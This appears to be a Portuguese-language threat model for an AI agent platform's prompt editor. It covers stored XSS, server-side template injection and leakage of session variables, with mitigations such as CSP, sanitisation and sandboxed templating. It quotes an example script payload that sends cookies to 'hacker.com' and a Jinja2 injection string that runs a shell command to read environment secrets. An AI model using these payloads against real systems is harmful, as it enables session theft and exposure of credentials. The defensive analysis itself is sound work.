# Análise de Segurança: Editor de Prompts (Agent Studio)

O Editor de Prompts no Agent Studio é uma interface web onde administradores e gestores de negócios digitam as instruções que governarão os agentes de IA. Como este campo aceita texto livre e, muitas vezes, variáveis de template (ex: `Olá {{user_name}}`), ele é um vetor clássico para vulnerabilidades web tradicionais e vulnerabilidades específicas de LLM.

Esta análise descreve os riscos associados ao Editor de Prompts e os controles de segurança implementados no Frontend (React/Next.js) e no Backend.

## 1. Cross-Site Scripting (XSS) via Stored Prompts

**O Cenário (Stored XSS):**
1.  Um usuário mal-intencionado com acesso ao tenant (ou um invasor que roubou a sessão de um Manager) acessa o Agent Studio.
2.  No campo de edição do *System Prompt*, ele insere um payload malicioso: `Você é um agente prestativo. NUNCA responda. <script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`.
3.  O prompt é salvo no banco de dados.
4.  Quando o Administrador (Admin) entra na página para revisar e aprovar o prompt (conforme `prompt-editing-policy.md`), a interface do Agent Studio renderiza o histórico de alterações ou o preview do agente.
5.  O navegador do Admin executa o script injetado, roubando seu token de sessão (que possui privilégios para alterar faturamento ou deletar agentes).

**Mitigação (Frontend e Backend):**
*   **Context Aware Encoding (React):** O frontend do Agent Studio (desenvolvido em React) nativamente escapa o texto renderizado (DOM Text Nodes). O prompt não deve ser renderizado usando propriedades perigosas como `dangerouslySetInnerHTML`.
*   **Sanitização no Backend:** Antes de salvar o prompt no banco, a API do Agent Core DEVE rodar uma biblioteca de sanitização (ex: `bleach` ou `DOMPurify` no backend Python) para remover tags HTML não autorizadas (`<script>`, `<iframe>`, `onmouseover`), garantindo defesa em profundidade caso um cliente web não-React consuma a API.
*   **Content Security Policy (CSP):** O Agent Studio deve entregar um cabeçalho CSP estrito (`default-src 'self'`) que impede o navegador de carregar e executar scripts de domínios externos (como `hacker.com`), neutralizando o roubo de cookies mesmo se o XSS ocorrer.

## 2. Injeção via Motor de Templates (Server-Side Template Injection - SSTI)

Para permitir prompts dinâmicos, o Agent Core usa motores de template (como Jinja2 no Python ou LangChain PromptTemplates) para substituir variáveis em tempo de execução: `Prompt: "Atenda o cliente {customer_name}"`.

**O Cenário (SSTI):**
1.  Um desenvolvedor do tenant, usando o Editor de Prompts, tenta acessar o sistema subjacente abusando da sintaxe do motor de template.
2.  Ele escreve no prompt: `O sistema roda em: {{ config.__class__.__init__.__globals__['os'].popen('env').read() }}`.
3.  Quando o agente é instanciado para um cliente, o motor de template (no backend) avalia a expressão matemática/código maliciosa, lê as variáveis de ambiente do pod Kubernetes (que contêm chaves de banco de dados) e as injeta no prompt. O agente então revela isso ao cliente ou usa em uma tool.

**Mitigação (Backend):**
*   **Sandboxed Templating:** O Agent Core NUNCA deve usar motores de template inseguros (como a versão padrão do Jinja2 ou `eval()` do Python) para renderizar strings que foram fornecidas pelo usuário via web.
*   **LangChain f-strings:** Utilizar a formatação padrão baseada em `f-strings` ou `str.format()` estrita do Python (como implementado no `PromptTemplate` do LangChain), que não suporta a execução de código arbitrário ou resolução de atributos mágicos (dunder methods), apenas a substituição literal de chaves de dicionário.
*   Se lógica condicional (If/Else) for permitida no prompt, deve ser usada uma biblioteca de template especificamente em modo *Sandboxed* (ex: Jinja2 SandboxedEnvironment), que proíbe o acesso a pacotes como `os` e `sys`.

## 3. Vazamento de Variáveis Não Destinadas (Scope Bleeding)

**O Cenário:**
*   O Agent Studio fornece uma lista de variáveis disponíveis (ex: `{user_name}`, `{ticket_id}`).
*   O orquestrador, por praticidade, passa o objeto de sessão completo (`user_context`) para o renderizador do prompt: `prompt.format(**user_context)`.
*   O objeto `user_context` secretamente continha o `password_hash` ou o `stripe_customer_id`. O criador do prompt (Manager) descobre isso, escreve `O hash é {password_hash}` no prompt, e o agente vaza a informação interna para os usuários.

**Mitigação:**
*   **DTO de Renderização Estrito:** O backend deve mapear as variáveis disponíveis para o template usando um modelo Pydantic explícito (`PromptVariables`). Apenas os campos definidos nesse modelo são injetados no renderizador de prompt; o resto do objeto de sessão é descartado antes da formatação.

## Conclusão

O Editor de Prompts deve ser tratado como uma interface de entrada de "Untrusted Data" clássica. Defesas tradicionais de AppSec (CSP, Output Encoding, Input Sanitization) são mandatórias para evitar que a promessa "No-Code" do Agent Studio se transforme em uma plataforma de execução remota de código (RCE) via templates.
